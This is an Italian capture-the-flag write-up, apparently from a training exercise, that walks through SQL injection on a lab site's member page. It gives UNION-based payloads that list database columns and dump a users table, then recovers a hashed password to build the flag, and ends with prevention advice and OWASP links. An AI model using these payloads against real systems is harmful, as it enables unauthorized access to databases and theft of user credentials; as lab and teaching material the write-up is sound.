


Navighiamo sulla pagina http://{IP_ADDRESS}/index.php?page=member

e notiamo tramite i DevTools che c'é un campo <input> non protetto da SQLinjection

Leggiamo tutte le tabelle
```
1 OR 1=1 UNION SELECT NULL, NULL--
```

ne troviamo 2, carichiamo le relative colonne
```
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

andiamo quindi a leggere tutti i dati contenuti in queste colonne
```
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

Notiamo che l'utente con id 5 contiene
```
user_id     5
first_name  Flag
last_name   GetThe
town        42
country     42
planet      42
Commentaire Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign 5ff9d0165b4f92b14994e5c685cdce28

```

a questo punto basta seguire le indicazioni per descriptare la password, otteniamo `FortyTwo`

ricriptiamola in sha256 e abbiamo la nostra flag!


Visto che é un attacco che va ad accedere direttamente al database bisogna fare un'attenzione particolare alcuni 
consigli di Prevenzione -->
```
uso di istruzioni preparate (con query parametrizzate)
uso di stored procedure
validazione dell'input nella whitelist
l'escape di tutti gli input forniti dall'utente
```
Documentatione

[owasp - SQL injection](https://www.owasp.org/index.php/SQL_Injection)

[owasp - prevent SQL injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

